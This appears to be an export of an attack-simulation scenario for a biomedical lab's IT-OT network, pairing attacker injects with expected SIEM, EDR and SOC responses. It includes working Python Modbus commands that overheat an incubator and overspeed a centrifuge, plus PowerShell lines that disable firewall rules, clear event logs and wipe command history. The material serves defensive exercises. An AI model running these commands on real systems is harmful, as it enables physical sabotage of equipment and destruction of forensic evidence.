expectations.expectation_name: SOC confirme breach IT-OT, prépare isolation PLC1

Décision critique: isoler immédiatement PLC1 ou maintenir connexion pour observer Phase 7 (sabotage) avec surveillance intensive? SOC évalue: (1) Snapshot registres Modbus actuels PLC1, (2) Activation capture réseau complète traffic Modbus, (3) Contact équipe laboratoire pour status échantillons critiques incubateur, (4) Préparation coupure réseau PLC1 si commande write détectée.

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

payload_attack_patterns.attack_pattern_description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Many command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).(Citation: US-CERT-TA18-106A) Some files and directories may require elevated or specific user permissions to access.

payload_attack_patterns.attack_pattern_description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363), [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to run malicious code.

Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.

The adversary is trying to gain higher-level permissions.

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: 

* SYSTEM/root level
* local administrator
* user account with admin-like access 
* user accounts with access to specific system or perform specific function

These techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.

The adversary is trying to gain higher-level permissions.

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: 

* SYSTEM/root level
* local administrator
* user account with admin-like access 
* user accounts with access to specific system or perform specific function

These techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.

The adversary is trying to maintain their foothold.

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.

injector_contract_attack_patterns.attack_pattern_description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363), [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)

Cette étape de validation est essentielle dans une attaque réaliste - elle prouve que la défense fonctionne et justifie la nécessité du bypass.

expectations.expectation_name: Firewall bloque connexions PowerShell vers Modbus (fonctionnement normal)
expectations.expectation_description: Règle  fonctionne correctement et bloque tentatives Test-NetConnection vers 10.0.0.80:502 et 10.0.0.59:502. TcpTestSucceeded=False démontre que défense firewall multi-couches est active et efficace. Cette prévention valide que configuration firewall protège effectivement PLCs contre accès non autorisés.

expectations.expectation_name: IDS détecte tentatives connexion bloquées vers PLCs Modbus
expectations.expectation_description: IDS/IPS réseau détecte tentatives connexion sortantes depuis 10.0.0.10 (SCADA server) vers 10.0.0.80:502 et 10.0.0.59:502 = test accès Modbus depuis processus non autorisé. Pattern: connexions bloquées par firewall mais tentatives répétées = reconnaissance pré-bypass. Corrélation avec événements Phases précédentes élève criticité.

expectations.expectation_name: Analyste confirme firewall fonctionne, anticipe bypass multiple imminent
expectations.expectation_description: SOC valide que défenses firewall sont actives et bloquent correctement accès Modbus. Cependant, tentatives connexion après inspection 3 règles = indicateur fort que attaquant planifie désactivation multiple règles pour bypass complet. Analyste se prépare à intervention rapide: si prochaine étape = disable 3 règles, action isolation serveur SCADA.

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to figure out your environment.

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

Cette attaque simultanée maximise dégâts et empêche intervention défensive ciblée (équipe terrain ne peut isoler qu'un équipement à la fois). Sabotage coordonné avec vérification immédiate typique attaque APT sophistiquée niveau nation-state (Colonial Pipeline, Triton/Trisis). Impact total: €25,350,000+ + pertes opérationnelles + contamination laboratoire.
injector_contract_payload.command_content:
& "C:\Program Files\Python312\python.exe" -c "from pymodbus.client import ModbusTcpClient; print('[ATTACK 1] Targeting INCUBATEUR-2024...'); plc1 = ModbusTcpClient('10.0.0.80', port=502, timeout=5); connection = plc1.connect(); result = plc1.write_register(address=0, value=650) if connection else None; print('  [!] Temperature set to 65.0C - SAMPLES WILL BE DESTROYED!') if (connection and result and not result.isError()) else print('  [X] Attack FAILED'); plc1.close() if connection else None"
& "C:\Program Files\Python312\python.exe" -c "from pymodbus.client import ModbusTcpClient; print('[ATTACK 2] Targeting CENTRIFUGEUSE-A...'); plc2 = ModbusTcpClient('10.0.0.59', port=502, timeout=5); connection = plc2.connect(); result = plc2.write_register(address=0, value=9999) if connection else None; print('  [!] Speed set to 9999 RPM - MECHANICAL DESTRUCTION IMMINENT!') if (connection and result and not result.isError()) else print('  [X] Attack FAILED'); plc2.close() if connection else None"

payload_attack_patterns.attack_pattern_description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas) A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023) Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms) Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to communicate with compromised systems to control them.

Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.

payload_attack_patterns.attack_pattern_description:
Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.

This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.

The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.

For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) 

Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.

injector_contract_attack_patterns.attack_pattern_description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas) A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023) Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms) Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to communicate with compromised systems to control them.

Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.

injector_contract_attack_patterns.attack_pattern_description:
Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.

This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.

The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.

For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) 

Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.

injector_contract_payload.payload_description: Test d'accès Modbus vers les PLCs. L'attaquant tente une connexion Modbus directe pour vérifier s'il peut communiquer avec les équipements industriels. Ce test révélera si des contrôles de sécurité (firewall applicatif) bloquent l'accès.

payload_attack_patterns.attack_pattern_description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as [Ping](https://attack.mitre.org/software/S0097), net view using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`. Adversaries may also analyze data from local host files (ex: C:\Windows\System32\Drivers\etc\hosts or /etc/hosts) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment. Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to figure out your environment.

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

injector_contract_payload.payload_description: Reconnaissance défenses: énumération règles firewall Windows ciblant protocole Modbus. Attaquant découvre règles P14-Block-Modbus-PowerShell/Python/CMD bloquant accès port 502, et règle P14-Allow-Modbus-SCADA-API autorisant uniquement scada_api.exe. Cette découverte identifie la barrière principale empêchant manipulation directe PLCs depuis PowerShell compromis, permettant planification bypass chirurgical.

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to figure out your environment.

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

injector_contract_payload.command_content:
Get-NetFirewallRule | Where-Object {$_.DisplayName -match "P14.*Modbus" -and $_.Enabled -eq "True"} | Select-Object DisplayName,Direction,Action,Program | Format-Table -AutoSize
Get-NetFirewallRule | Where-Object {$_.DisplayName -eq "P14-Block-Modbus-PowerShell"} | Select-Object DisplayName,Enabled,Direction,Action,Program,RemotePort | Format-List

expectations.expectation_name: GPO + Protected Event Logs bloquent effacement logs critiques
expectations.expectation_description: Configuration défensive avancée empêche cover tracks: (1) GPO Security Policy bloque Clear-EventLog par non-SYSTEM accounts, (2) Event Log audit settings protègent logs Security/System, (3) SIEM WEF (Windows Event Forwarding) copie logs temps réel vers serveur centralisé (attaquant ne peut effacer), (4) Event Subscriptions forwarding actif. Même avec privilèges admin local, effacement logs critiques bloqué. Forensics préservé obligatoirement.

expectations.expectation_name: SIEM détecte Event 1102 + cover tracks sophistiqué - APT confirmé -
expectations.expectation_description: SIEM détecte séquence CRITIQUE cover tracks APT: (1) Event 4948 (×3): firewall rules re-enabled (masquer bypass Phase 6), (2) Sysmon Event 23: suppression research_backup.zip (masquer exfiltration Phase 8), (3) Event 1102: tentative effacement Event Logs Security/System/Application (masquer timeline), (4) PowerShell history clearing détecté. Corrélation = SIGNATURE APT NIVEAU NATION-STATE: attaquant tente masquer TTPs après mission accomplie. MAIS logs SIEM centralisés préservés (WEF temps réel), timeline complète Phases 1-9 intacte. Tentative cover tracks CONFIRME sophistication attaque, élève criticité incident niveau MAXIMAL. Investigation: timeline documentée malgré tentative effacement = forensics réussi.

expectations.expectation_name: Cover tracks partiellement réussi - forensics locale difficile, SIEM préservé
expectations.expectation_description: Attaquant réussit partiellement cover tracks côté local VM2: (1) Firewall rules restaurées = apparence normale (bypass Phase 6 masqué), (2) Archive staging supprimée = pas artifact local (exfiltration Phase 8 masquée localement), (3) Event Logs effacés localement = timeline attaque invisible sur VM2, (4) PowerShell history cleared = commandes invisibles. Investigation locale TRÈS DIFFICILE: pas logs Windows, pas artifacts, configuration apparence normale. MAIS forensics toujours possible: (1) **SIEM centralisé préservé** (WEF temps réel, attaquant ne peut effacer serveur SIEM), timeline complète Phases 1-9 intacte, (2) **PCAP network capturé** (exfiltration prouvée, archive reconstructible), (3) **Dégâts physiques OT** (PLC1 INCUBATEUR échantillons détruits, PLC2 CENTRIFUGEUSE endommagée = preuve irréfutable sabotage), (4) Sysmon si déployé (logs forwarding SIEM). Cover tracks ralentit investigation locale mais n'empêche PAS forensics centralisée. Attribution difficile sans logs locaux mais dégâts physiques + SIEM = preuve attaque réussie.

payload_attack_patterns.attack_pattern_description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include del on Windows, rm or unlink on Linux and macOS, and `rm` on ESXi.

Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware) Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021) Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369) In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor. Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk) Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)

injector_contract_payload.command_content:
Set-NetFirewallRule -DisplayName "P14-Block-Modbus-PowerShell" -Enabled True
Set-NetFirewallRule -DisplayName "P14-Block-Modbus-Python" -Enabled True
Set-NetFirewallRule -DisplayName "P14-Block-Modbus-CMD" -Enabled True
Remove-Item "C:\Windows\Temp\research_backup.zip" -Force -ErrorAction SilentlyContinue
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
Clear-EventLog -LogName System -ErrorAction SilentlyContinue
Clear-EventLog -LogName Application -ErrorAction SilentlyContinue
Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Get-NetFirewallRule -DisplayName "P14-Block-Modbus-*" | Where-Object {$_.Enabled -eq $true} | Measure-Object | Select-Object Count
Test-Path "C:\Windows\Temp\research_backup.zip"
Get-EventLog -LogName Security -Newest 1 -ErrorAction SilentlyContinue | Measure-Object | Select-Object Count

scenario_injects.inject_description: BYPASS COMPLET - Action critique: Désactivation (Enabled: False) des 3 règles firewall bloquant accès Modbus (PowerShell + Python + CMD). Cette approche exhaustive garantit flexibilité maximale Phase 7: si sabotage nécessite scripts Python pour manipulation registres complexes ou commandes CMD pour exécution batch, aucune défense résiduelle ne bloquera. Stratégie sophistiquée: désactivation ciblée des 3 règles OT préserve leur présence dans configuration (moins suspicieux que suppression) tout en déverrouillant accès Modbus total. Les règles restent visibles mais inactives. Vérification finale confirme désactivation réussie (Enabled: False).

expectations.expectation_name: Destruction complète segmentation IT-OT - PLCs totalement exposés
expectations.expectation_description: Désactivation des 3 règles P14-Block-Modbus-* détruit intégralement segmentation IT-OT basée sur program-level firewall. PowerShell, Python, ET CMD peuvent maintenant établir connexions Modbus vers PLCs laboratoire biomédical sans aucune restriction. Impact MAXIMAL: (1) Accès Modbus illimité PLC1 INCUBATEUR €350K via n'importe quel vecteur, (2) Accès Modbus illimité PLC2 CENTRIFUGEUSE €25M+ multi-vecteur, (3) Flexibilité sabotage totale: scripts Python complexes, batch CMD, PowerShell, (4) Défense-in-depth OT complètement compromise, (5) Capacité manipulation registres Modbus sans restriction = sabotage multi-équipements coordonné possible Phase 7.

expectations.expectation_name: La securite policy empêche désactivation règles firewall P14-Block-Modbus-*
expectations.expectation_description: Group Policy Object avec application stricte empêche modification (Set-NetFirewallRule -Enabled False) des règles firewall ayant DisplayName commençant par "P14-Block-Modbus-" par tout compte n'appartenant pas au groupe "SecOps-Firewall-Admins". Même administrateur local compromis ne peut désactiver les 3 règles critiques OT. GPO force-appliquée toutes les 15 minutes restaure automatiquement règles (Enabled: True) si désactivation temporaire réussit.

expectations.expectation_name: SIEM alerte désactivation coordonnée 3 règles protection OT

Pattern signature APT ciblant infrastructure SCADA.

expectations.expectation_name: SOC déclare incident critique niveau 1, active protocole crise OT

Actions urgentes immédiates: (1) Notification CERT OT + CERT national (infrastructure critique santé), (2) Activation cellule de crise OT, (3) Snapshots état PLCs (tous registres Modbus), (4) Activation surveillance Modbus traffic temps réel avec DPI, (5) Équipe technique terrain en alerte maximale intervention physique immédiate si sabotage détecté, (6) Préparation isolation complète zone OT (VLAN cut), (7) Notification direction: incident critique maximal, risque majeur activité laboratoire.

injector_contract_payload.payload_description: BYPASS COMPLET - Action critique: Désactivation (Enabled: False) des 3 règles firewall bloquant accès Modbus (PowerShell + Python + CMD). Cette approche exhaustive garantit flexibilité maximale Phase 7: si sabotage nécessite scripts Python pour manipulation registres complexes ou commandes CMD pour exécution batch, aucune défense résiduelle ne bloquera. Stratégie sophistiquée: désactivation ciblée des 3 règles OT préserve leur présence dans configuration (moins suspicieux que suppression) tout en déverrouillant accès Modbus total. Les règles restent visibles mais inactives. Vérification finale confirme désactivation réussie (Enabled: False).

payload_attack_patterns.attack_pattern_description: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware) Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021) Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369) In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor. Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk) Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)

injector_contract_payload.command_content:
Set-NetFirewallRule -DisplayName "P14-Block-Modbus-PowerShell" -Enabled False
Set-NetFirewallRule -DisplayName "P14-Block-Modbus-Python" -Enabled False
Set-NetFirewallRule -DisplayName "P14-Block-Modbus-CMD" -Enabled False
Get-NetFirewallRule -DisplayName "P14-Block-Modbus-*" | Select-Object DisplayName,Enabled | Format-Table -AutoSize

scenario_injects.inject_description: Staging données pour exfiltration: L'attaquant compresse données sensibles identifiées dans archive ZIP pour faciliter exfiltration. Création archive "research_backup.zip" dans C:\Windows\Temp (répertoire temporaire légitime). Compression inclut: configurations SCADA, logs PLCs, documents laboratoire. Taille archive ~30MB (données fictives). Archive nommée innocemment "backup" pour éviter suspicion. Staging typique avant exfiltration réseau.

expectations.expectation_name: EDR bloque compression données sensibles staging
expectations.expectation_description: EDR détecte Compress-Archive vers C:\Windows\Temp avec sources multiples (SCADA, logs PLCs) = staging pré-exfiltration. Politique EDR bloque création archives volumineuses dans répertoires temporaires par processus suspects. Protection anti-exfiltration active.

expectations.expectation_name: SIEM détecte staging données dans répertoire temporaire
expectations.expectation_description: SIEM détecte création archive ZIP "research_backup.zip" dans C:\Windows\Temp contenant fichiers SCADA/PLCs = staging classique pré-exfiltration. Sysmon Event 11 (FileCreate) + Sysmon Event 1 (Compress-Archive). Nom "backup" = tentative camouflage. Corrélation: sabotage Phase 7 + reconnaissance Phase 8 + staging = exfiltration imminente.

expectations.expectation_name: SOC confirme préparation exfiltration - isolation réseau imminente
expectations.expectation_description: Analyste confirme staging données sensibles = exfiltration network imminent (délai estimé: 5-15 min). Décision critique: isolation réseau serveur SCADA MAINTENANT (prévient exfiltration) ou surveillance (capture C2 destination). Préparation coupure internet sortant si upload détecté.

